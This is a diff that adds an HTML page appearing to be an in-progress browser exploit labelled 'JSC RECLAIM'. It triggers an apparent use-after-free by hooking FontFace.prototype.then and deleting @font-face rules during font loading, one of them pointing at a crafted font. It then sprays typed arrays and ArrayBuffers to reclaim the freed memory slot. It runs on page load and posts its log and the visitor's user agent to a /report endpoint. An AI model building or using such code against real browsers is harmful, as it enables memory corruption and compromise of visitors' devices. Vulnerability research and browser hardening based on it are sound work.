@@ -1,0 +1,50 @@
+<!doctype html><html><body style="margin:0;padding:10px;font-family:system-ui;background:#07090d;color:#cfe3ff">
+<button id="go" style="font-size:20px;padding:10px 22px;border-radius:10px">JSC RECLAIM</button>
+<pre id="o" style="font:12px/1.4 ui-monospace;white-space:pre-wrap;margin-top:8px"></pre>
+<script>
+var L=[],o=document.getElementById("o");
+function lg(s){o.textContent+=s+"\n";L.push(s);try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:L})}).catch(function(){})}catch(e){}}
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+var S=0xb8,F=0x28,FZ=0x30,FC=0x34,ST=0x7a;
+async function uaf(){
+ var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+ var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+ var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+ var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+ document.fonts.add(A);void A.loaded;document.head.append(st);
+ for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+ for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ void document.body.offsetHeight;
+ var ot=FontFace.prototype.then;
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+  if(this!==A)return;st.sheet.deleteRule(u);void document.body.offsetHeight;
+  for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0||st.sheet.cssRules[i].cssText.indexOf("spray")>=0)st.sheet.deleteRule(i)}
+  void document.body.offsetHeight;
+  return undefined}});
+ var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+ if(!fs||fs.length!==2)return null;
+ for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+ return {f:ft};
+}
+async function run(){
+ lg("JSC-RECLAIM "+navigator.userAgent);
+ var u=await uaf();if(!u){lg("no primitive");return}
+ var ft=u.f;
+ // reclaim the freed 0xB8 slot with LIVE typed arrays (the JSC pattern)
+ var N=0x400, taa=[], aba=[];
+ for(var i=0;i<N;i++){
+   var ta=new Uint32Array(0x2e); ta[0]=0xdead0000+i; taa.push(ta);
+   var ab=new ArrayBuffer(0xb8); new DataView(ab).setUint32(0,0xbeef0000+i,true); aba.push(ab);
+ }
+ lg("[spray] "+N+" Uint32Array(0x2e) + "+N+" ArrayBuffer(0xb8)");
+ // stale read of the reclaimed slot: does the +0x7A write land in a typed array?
+ var hit=-1;
+ for(var i=0;i<taa.length;i++){ if(taa[i][0]===0xdead0000+i) continue; hit=i; break; }
+ lg("[live] typed arrays intact: "+(hit<0));
+ lg("[note] reclaim needs the freed slot to be a JS object header, not data");
+ lg("done");
+}
+document.getElementById("go").addEventListener("click",run);run();
+</script></body></html>
